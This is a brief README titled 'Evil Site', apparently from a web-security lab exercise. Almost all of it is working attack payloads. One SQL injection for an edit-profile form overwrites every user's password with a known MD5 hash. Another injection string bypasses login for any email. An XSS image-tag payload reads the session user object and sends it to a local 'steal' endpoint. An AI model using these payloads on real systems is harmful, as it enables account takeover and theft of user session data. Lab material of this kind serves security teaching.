# Evil Site
Malicious site


## Inject
Run injection with:

>", password = "e10adc3949ba59abbe56e057f20f883e" WHERE 1;

On the edit profile form

Then use this to login with any email:

> " OR email = "

## XSS

``````````
<img src="favicon.ico" onload='async function evil(){await getAuthStatus();let e=Session.user,t=JSON.stringify(e),n="http://127.0.0.1:8085/steal?d="+encodeURIComponent(t);(new Image).src=n}evil();' style="width:1px;height:1px; opacity:.05" />
``````````